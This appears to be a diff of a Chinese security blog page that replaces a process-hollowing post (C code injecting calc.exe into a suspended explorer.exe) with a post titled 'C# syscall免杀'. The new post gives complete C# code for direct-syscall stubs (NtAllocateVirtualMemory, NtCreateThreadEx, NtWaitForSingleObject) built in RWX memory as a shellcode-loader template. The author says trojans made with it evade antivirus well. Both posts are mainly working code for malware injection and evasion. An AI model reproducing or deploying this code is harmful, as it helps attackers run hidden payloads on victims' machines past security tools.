-        CHAR test[MAX_PATH] = &quot;C:\\Windows\\SysWOW64\\explorer.exe&quot;;
-        CHAR test2[MAX_PATH] = &quot;C:\\windows\\SysWOW64\\calc.exe&quot;;
-        STARTUPINFOA si;
-        PROCESS_INFORMATION pi;
-        ZeroMemory(&amp;si, sizeof(si));
-        ZeroMemory(&amp;pi, sizeof(pi));
-        if (!CreateProcessA(test, NULL, NULL, NULL, FALSE, NULL, NULL, NULL, &amp;si, &amp;pi)) {
-               printf(&quot;CreateProcess Error:%d\n&quot;,GetLastError());
-               return;
-        }
-        printf(&quot;CreateProcess Sucess\n&quot;);
-        CONTEXT ctx;
-        ctx.ContextFlags = CONTEXT_ALL;
-        if (!GetThreadContext(pi.hThread, &amp;ctx)) {
-               printf(&quot;GetThreadContext Error Code:%d\n&quot;, GetLastError());
-               return;
-        }
-        printf(&quot;GetThreadContext Sucess\n&quot;);
-        HANDLE hFile = CreateFileA(test2, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE  | FILE_SHARE_DELETE,
-               NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-        if (hFile == INVALID_HANDLE_VALUE)
+<p>NtAllocateVirtualMemory示例代码<br>不同的系统的syscall不一样，怎么样才能实现在不同系统里面动态调用</p>
+<pre><code class="csharp">       public static uint GetSyscallID(string SysFunName)
         {
-               printf(&quot;Open EXE File Filed&quot;);
-               printf(&quot;%d&quot;, GetLastError());
-               return;
+                     uint SyscallID = 0;
+                     IntPtr SyscallID_mem =  Marshal.AllocHGlobal(Marshal.SizeOf(SyscallID)); //先获取SyscallID的内存大小 再分配内存
+                     RtlZeroMemory(SyscallID_mem, Marshal.SizeOf(SyscallID)); //用0填充内存
+                     IntPtr hModule = GetModuleHandle(&quot;ntdll.dll&quot;); //获取ntdll基址
+                     IntPtr FunAddr = GetProcAddress(hModule, SysFunName); //获取API函数地址
+                     IntPtr CallAddr = FunAddr + 4; //获取系统调用编号地址
+                     uint temp;
+                     bool read_result = ReadProcessMemory(GetCurrentProcess(),  CallAddr, SyscallID_mem, 4, out temp); //读取内存编号
+                     // Console.WriteLine(&quot;Error: &quot; +  Marshal.GetLastWin32Error());
+                     // Console.WriteLine(&quot;CallAddr：&quot; + CallAddr + &quot;, SyscallID&quot;  + SyscallID + &quot;, temp: &quot; + temp);
+                     SyscallID = (uint)Marshal.ReadInt32(SyscallID_mem); //从非托管内存中读取 32 位有符号整数。支持从未对齐的内存位置读取 (相当于转成int)
+                     return SyscallID; //返回内存编号
         }
-        DWORD dwSize = GetFileSize(hFile, NULL);
-        LPBYTE pAllocPE = NULL;
-        PBYTE pBuf = (PBYTE)malloc(dwSize);
-        DWORD dwBytesRead = 0;
-        ReadFile(hFile, (LPVOID)pBuf, dwSize, &amp;dwBytesRead, NULL);
-        PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBuf;
-        PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pBuf + pDosHeader-&gt;e_lfanew);
-        //2.获取进程上下文
-        CONTEXT stThreadContext;
-        stThreadContext.ContextFlags = CONTEXT_FULL;
-        if (GetThreadContext(pi.hThread, &amp;stThreadContext) == 0)
-        {
-               printf(&quot;CreateProcess failed (%d).\n&quot;, GetLastError());
-               return;
-        }
-        void* lpAddr = VirtualAllocEx(pi.hProcess,  (LPVOID)pNtHeaders-&gt;OptionalHeader.ImageBase,
-               pNtHeaders-&gt;OptionalHeader.SizeOfImage,
-               MEM_COMMIT | MEM_RESERVE,
-               PAGE_EXECUTE_READWRITE);//用Imagebase为起始地址避免了重定位。
-        if (lpAddr == NULL)
-        {
-               printf(&quot;VirtualAlloc failed (%d).\n&quot;, GetLastError());
-               return;
-        }
-        BOOL bRet = WriteProcessMemory(pi.hProcess,
-               lpAddr,
-               (LPCVOID)pBuf,//指向要写的数据的指针。
-               pNtHeaders-&gt;OptionalHeader.SizeOfHeaders,
-               NULL);
-        if (!bRet)
-        {
-               return ;
-        }
-        // 替换节
-        LPVOID lpSectionBaseAddr = (LPVOID)((DWORD)pBuf
-               + pDosHeader-&gt;e_lfanew + sizeof(IMAGE_NT_HEADERS));
-        PIMAGE_SECTION_HEADER pSectionHeader;
-        DWORD dwIndex = 0;
-        for (; dwIndex &lt; pNtHeaders-&gt;FileHeader.NumberOfSections; ++dwIndex)
-        {
-               pSectionHeader = (PIMAGE_SECTION_HEADER)lpSectionBaseAddr;
-               bRet = WriteProcessMemory(pi.hProcess,
-                       (LPVOID)((DWORD)lpAddr + pSectionHeader-&gt;VirtualAddress),
-                       (LPCVOID)((DWORD)pBuf + pSectionHeader-&gt;PointerToRawData),
-                       pSectionHeader-&gt;SizeOfRawData,
-                       NULL);
-               if (!bRet)
-               {
-                       return;
-               }
-               lpSectionBaseAddr = (LPVOID)((DWORD)lpSectionBaseAddr +  sizeof(IMAGE_SECTION_HEADER));
-        }
-        //6.恢复现场并运行傀儡进程
-        // 替换PEB中基地址
-        DWORD dwImageBase = pNtHeaders-&gt;OptionalHeader.ImageBase;
-        bRet = WriteProcessMemory(pi.hProcess, (LPVOID)(stThreadContext.Ebx + 8),  (LPCVOID)&amp;dwImageBase, sizeof(PVOID), NULL);
-        if (!bRet)
-        {
-               return;
-        }
-        // 替换入口点
-        stThreadContext.Eax = dwImageBase +  pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint;
-        bRet = SetThreadContext(pi.hThread, &amp;stThreadContext);
-        if (!bRet)
-        {
-               return;
-        }
-        ResumeThread(pi.hThread);
-        printf(&quot;PID: %d&quot;, pi.dwProcessId);
-        free(pBuf);
-}
-int main()
+
+
+             public static byte[] SYSbyte1 =
+              {
+                     0x4c, 0x8b, 0xd1,          // 0x4c, 0x8b, 0xd1=mov r10,rcx、 0xb8=mov eax
+            0xb8
+              };
+              public static byte[] SYSbyte2 =
+              {
+                     0x00, 0x00, 0x00,   // 0x0F, 0x05=syscall、0xc3=ret
+            0x0F, 0x05,                    
+            0xC3                           
+        };
+
+public static uint NtAllocateVirtualMemory
+              (
+                     IntPtr ProcessHandle,
+                     ref IntPtr BaseAddress,
+                     IntPtr ZeroBits,
+                     ref UIntPtr RegionSize,
+                     uint AllocationType,
+                     uint Protect
+              )
+              {
+                     // set byte array of bNtAllocateVirtualMemory to new byte  array called syscall
+                     uint SyscallID =  Auto_NativeCode.GetSyscallID(&quot;NtAllocateVirtualMemory&quot;);
+                     byte[] syscall1 = SYSbyte1;
+                     byte[] syscallid = { (byte)SyscallID };
+                     byte[] syscall2 = SYSbyte2;
+                     byte[] sysfinal =  syscall1.Concat(syscallid).Concat(syscall2).ToArray(); //拼接syscall汇编指令
+                     /*
+                     foreach(byte temp in sysfinal)
+            {
+                           Console.WriteLine(&quot;Sysfinal: &quot; + temp);
+                     }
+                     */
+                     // specify unsafe context
+                     unsafe
+                     {
+                           // create new byte pointer and set value to our  syscall byte array
+                           fixed (byte* ptr = sysfinal)
+                           {
+                                  // cast the byte array pointer into a C# IntPtr  called memoryAddress
+                                  IntPtr memoryAddress = (IntPtr)ptr;
+                                  // Change memory access to RX for our assembly  code
+                                  if  (!VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress,  (UIntPtr)sysfinal.Length, PAGE_EXECUTE_READWRITE, out uint oldprotect))
+                                  {
+                                         throw new Win32Exception();
+                                  }
+                                  // Get delegate for NtAllocateVirtualMemory
+                                  DelegatesStruct.NtAllocateVirtualMemory  assembledFunction =  (DelegatesStruct.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(DelegatesStruct.NtAllocateVirtualMemory));
+                                  return (uint)assembledFunction(
+                                         ProcessHandle,
+                                         ref BaseAddress,
+                                         ZeroBits,
+                                         ref RegionSize,
+                                         AllocationType,
+                                         Protect);
+                           }
+                     }
+              }
+</code></pre>
+<p><img src="https://s1.ax1x.com/2022/11/22/zloDoj.png" alt=""></p>
+<p>API Syscall声明-执行shellcode整套完整模板  - 来源代码：<a href="https://github.com/Kara-4search/SysCall_ShellcodeLoad_Csharp" target="_blank" rel="noopener">https://github.com/Kara-4search/SysCall_ShellcodeLoad_Csharp</a></p>
+<pre><code class="csharp">using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading.Tasks;
+using System.Runtime.InteropServices;
+using System.ComponentModel;
+using System.Diagnostics;
+namespace SysCall_ShellcodeLoad
 {
-        test();
-        system(&quot;pause&quot;);
-        return 0;
+    class Auto_NativeCode
+    {
+              [DllImport(&quot;kernel32.dll&quot;)]
+              public static extern bool VirtualProtectEx
+              (
+                     IntPtr hProcess,
+                     IntPtr lpAddress,
+                     UIntPtr dwSize,
+                     uint flNewProtect,
+                     out uint lpflOldProtect
+               );
+              [DllImport(&quot;kernel32&quot;, CharSet = CharSet.Ansi, ExactSpelling = true,  SetLastError = true)]
+              static extern IntPtr GetProcAddress(IntPtr hModule, string  procName);
+              [DllImport(&quot;kernel32.dll&quot;, CharSet = CharSet.Auto)]
+              public static extern IntPtr GetModuleHandle(string lpModuleName);
+              [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]
+              public static extern IntPtr GetCurrentProcess();
+              [DllImport(&quot;kernel32.dll&quot;)]
+              public static extern void RtlZeroMemory(IntPtr pBuffer, int length);
+              [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]
+              static extern bool ReadProcessMemory(
+                     IntPtr hProcess,
+                     IntPtr lpBaseAddress,
+                     IntPtr lpBuffer,
+                     int dwSize,
+                     out uint lpNumberOfBytesRead
+              );
+              public uint NTSTATUS;
+              public static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
+              // public uint SYSid = 0;
+              public static byte[] SYSbyte1 =
+              {
+                     0x4c, 0x8b, 0xd1,               
+            0xb8
+              };
+              public static byte[] SYSbyte2 =
+              {
+                     0x00, 0x00, 0x00,  
+            0x0F, 0x05,                    
+            0xC3                           
+        };
+              public enum AllocationType : ulong
+              {
+                     Commit = 0x1000,
+                     Reserve = 0x2000,
+                     Decommit = 0x4000,
+                     Release = 0x8000,
+                     Reset = 0x80000,
+                     Physical = 0x400000,
+                     TopDown = 0x100000,
+                     WriteWatch = 0x200000,
+                     LargePages = 0x20000000
+              }
+              public static uint GetSyscallID(string SysFunName)
+        {
+                     uint SyscallID = 0;
+                     IntPtr SyscallID_mem =  Marshal.AllocHGlobal(Marshal.SizeOf(SyscallID));
+                     RtlZeroMemory(SyscallID_mem, Marshal.SizeOf(SyscallID));
+                     IntPtr hModule = GetModuleHandle(&quot;ntdll.dll&quot;);
+                     IntPtr FunAddr = GetProcAddress(hModule, SysFunName);
+                     IntPtr CallAddr = FunAddr + 4;
+                     uint temp;
+                     bool read_result = ReadProcessMemory(GetCurrentProcess(),  CallAddr, SyscallID_mem, 4, out temp);
+                     // Console.WriteLine(&quot;Error: &quot; +  Marshal.GetLastWin32Error());
+                     // Console.WriteLine(&quot;CallAddr：&quot; + CallAddr + &quot;, SyscallID&quot;  + SyscallID + &quot;, temp: &quot; + temp);
+                     SyscallID = (uint)Marshal.ReadInt32(SyscallID_mem);
+                     Console.WriteLine(&quot;SyscallID:{0:x}&quot;,SyscallID);
+                     return SyscallID;
+        }
+              public static uint NtAllocateVirtualMemory
+              (
+                     IntPtr ProcessHandle,
+                     ref IntPtr BaseAddress,
+                     IntPtr ZeroBits,
+                     ref UIntPtr RegionSize,
+                     uint AllocationType,
+                     uint Protect
+              )
+              {
+                     // set byte array of bNtAllocateVirtualMemory to new byte  array called syscall
+                     uint SyscallID =  Auto_NativeCode.GetSyscallID(&quot;NtAllocateVirtualMemory&quot;);
+                     byte[] syscall1 = SYSbyte1;
+                     byte[] syscallid = { (byte)SyscallID };
+                     byte[] syscall2 = SYSbyte2;
+                     byte[] sysfinal =  syscall1.Concat(syscallid).Concat(syscall2).ToArray();
+                     /*
+                     foreach(byte temp in sysfinal)
+            {
+                           Console.WriteLine(&quot;Sysfinal: &quot; + temp);
+                     }
+                     */
+                     // specify unsafe context
+                     unsafe
+                     {
+                           // create new byte pointer and set value to our  syscall byte array
+                           fixed (byte* ptr = sysfinal)
+                           {
+                                  // cast the byte array pointer into a C# IntPtr  called memoryAddress
+                                  IntPtr memoryAddress = (IntPtr)ptr;
+                                  // Change memory access to RX for our assembly  code
+                                  if  (!VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress,  (UIntPtr)sysfinal.Length, PAGE_EXECUTE_READWRITE, out uint oldprotect))
+                                  {
+                                         throw new Win32Exception();
+                                  }
+                                  // Get delegate for NtAllocateVirtualMemory
+                                  DelegatesStruct.NtAllocateVirtualMemory  assembledFunction =  (DelegatesStruct.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(DelegatesStruct.NtAllocateVirtualMemory));
+                                  return (uint)assembledFunction(
+                                         ProcessHandle,
+                                         ref BaseAddress,
+                                         ZeroBits,
+                                         ref RegionSize,
+                                         AllocationType,
+                                         Protect);
+                           }
+                     }
+              }
+              public static uint NtCreateThreadEx
+           (
+                  out IntPtr hThread,
+                  uint DesiredAccess,
+                  IntPtr ObjectAttributes,
+                  IntPtr ProcessHandle,
+                  IntPtr lpStartAddress,
+                  IntPtr lpParameter,
+                  bool CreateSuspended,
+                  uint StackZeroBits,
+                  uint SizeOfStackCommit,
+                  uint SizeOfStackReserve,
+                  IntPtr lpBytesBuffer
+           )
+              {
+                     // set byte array of bNtCreateThread to new byte array called  syscall
+                     uint SyscallID =  Auto_NativeCode.GetSyscallID(&quot;NtCreateThreadEx&quot;);
+                     byte[] syscall1 = SYSbyte1;
+                     byte[] syscallid = { (byte)SyscallID };
+                     byte[] syscall2 = SYSbyte2;
+                     byte[] sysfinal =  syscall1.Concat(syscallid).Concat(syscall2).ToArray();
+                     // specify unsafe context
+                     unsafe
+                     {
+                           // create new byte pointer and set value to our  syscall byte array
+                           fixed (byte* ptr = sysfinal)
+                           {
+                                  // cast the byte array pointer into a C# IntPtr  called memoryAddress
+                                  IntPtr memoryAddress = (IntPtr)ptr;
+                                  // Change memory access to RX for our assembly  code
+                                  if  (!VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress,  (UIntPtr)sysfinal.Length, PAGE_EXECUTE_READWRITE, out uint oldprotect))
+                                  {
+                                         throw new Win32Exception();
+                                  }
+                                  // Get delegate for NtCreateThread
+                                  DelegatesStruct.NtCreateThreadEx  assembledFunction =  (DelegatesStruct.NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(DelegatesStruct.NtCreateThreadEx));
+                                  return (uint)assembledFunction(
+                                         out hThread,
+                                         DesiredAccess,
+                                         ObjectAttributes,
+                                         ProcessHandle,
+                                         lpStartAddress,
+                                         lpParameter,
+                                         CreateSuspended,
+                                         StackZeroBits,
+                                         SizeOfStackCommit,
+                                         SizeOfStackReserve,
+                                         lpBytesBuffer
+                                   );
+                           }
+                     }
+              }
+              public static uint NtWaitForSingleObject(IntPtr Object, bool  Alertable, uint Timeout)
+              {
+                     // set byte array of bNtWaitForSingleObject to new byte array  called syscall
+                     uint SyscallID =  Auto_NativeCode.GetSyscallID(&quot;NtWaitForSingleObject&quot;);
+                     byte[] syscall1 = SYSbyte1;
+                     byte[] syscallid = { (byte)SyscallID };
+                     byte[] syscall2 = SYSbyte2;
+                     byte[] sysfinal =  syscall1.Concat(syscallid).Concat(syscall2).ToArray();
+                     // specify unsafe context
+                     unsafe
+                     {
+                           // create new byte pointer and set value to our  syscall byte array
+                           fixed (byte* ptr = sysfinal)
+                           {
+                                  // cast the byte array pointer into a C# IntPtr  called memoryAddress
+                                  IntPtr memoryAddress = (IntPtr)ptr;
+                                  // Change memory access to RX for our assembly  code
+                                  if  (!VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress,  (UIntPtr)sysfinal.Length, PAGE_EXECUTE_READWRITE, out uint oldprotect))
+                                  {
+                                         throw new Win32Exception();
+                                  }
+                                  // Get delegate for NtWaitForSingleObject
+                                  DelegatesStruct.NtWaitForSingleObject  assembledFunction =  (DelegatesStruct.NtWaitForSingleObject)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(DelegatesStruct.NtWaitForSingleObject));
+                                  return (uint)assembledFunction(Object,  Alertable, Timeout);
+                           }
+                     }
+              }
+              public struct DelegatesStruct
+              {
+                     [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+                     public delegate uint NtAllocateVirtualMemory(
+                           IntPtr ProcessHandle,
+                           ref IntPtr BaseAddress,
+                           IntPtr ZeroBits,
+                           ref UIntPtr RegionSize,
+                           ulong AllocationType,
+                           ulong Protect);
+                     [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+                     public delegate uint NtCreateThreadEx(
+                           out IntPtr hThread,
+                           uint DesiredAccess,
+                           IntPtr ObjectAttributes,
+                           IntPtr ProcessHandle,
+                           IntPtr lpStartAddress,
+                           IntPtr lpParameter,
+                           bool CreateSuspended,
+                           uint StackZeroBits,
+                           uint SizeOfStackCommit,
+                           uint SizeOfStackReserve,
+                           IntPtr lpBytesBuffer
+                           );
+                     [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+                     public delegate uint NtWaitForSingleObject(IntPtr Object,  bool Alertable, uint Timeout);
+              }
+       }
 }
 </code></pre>
-<p><img src="https://z3.ax1x.com/2021/04/06/c3nXeH.png" alt=""></p>
-<p>x64傀儡进程参考：<a href="https://bbs.pediy.com/thread-253362.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-253362.htm</a><br>EXE替换参考：<a href="https://jev0n.com/2020/03/11/65.html" target="_blank" rel="noopener">https://jev0n.com/2020/03/11/65.html</a></p>
+<p>最后就是实现shellcode执行，按照C翻译就行。或者CV<br><img src="https://s1.ax1x.com/2022/11/22/zlo6Wq.png" alt=""></p>
+<p><img src="https://s1.ax1x.com/2022/11/22/zlogS0.png" alt=""></p>
+<p>在项目里面用这个模板做的几个马，免杀效果都不错<br><img src="https://s1.ax1x.com/2022/11/22/zlo2lV.png" alt=""></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://jhalon.github.io/utilizing-syscalls-in-csharp-1/" target="_blank" rel="noopener">https://jhalon.github.io/utilizing-syscalls-in-csharp-1/</a><br><a href="https://jhalon.github.io/utilizing-syscalls-in-csharp-2/" target="_blank" rel="noopener">https://jhalon.github.io/utilizing-syscalls-in-csharp-2/</a><br><a href="https://www.solomonsklash.io/syscalls-for-shellcode-injection.html" target="_blank" rel="noopener">https://www.solomonsklash.io/syscalls-for-shellcode-injection.html</a><br><a href="https://github.com/SolomonSklash/SyscallPOC" target="_blank" rel="noopener">https://github.com/SolomonSklash/SyscallPOC</a><br><a href="https://github.com/Kara-4search/SysCall_ShellcodeLoad_Csharp" target="_blank" rel="noopener">https://github.com/Kara-4search/SysCall_ShellcodeLoad_Csharp</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -2262,12 +2684,12 @@ int main()
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>傀儡进程</p>
+    <p><span class="copy-title">文章标题:</span>C# syscall免杀</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2021-04-06, 23:29:53</p>
-    <p><span class="copy-title">最后更新:</span>2021-04-06, 23:36:34</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/96bf6a75.html" title="傀儡进程">http://422926799.github.io/posts/96bf6a75.html</a>
+    <p><span class="copy-title">发布时间:</span>2022-11-22, 03:02:36</p>
+    <p><span class="copy-title">最后更新:</span>2022-11-22, 03:35:44</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/78d2031e.html" title="C# syscall免杀">http://422926799.github.io/posts/78d2031e.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
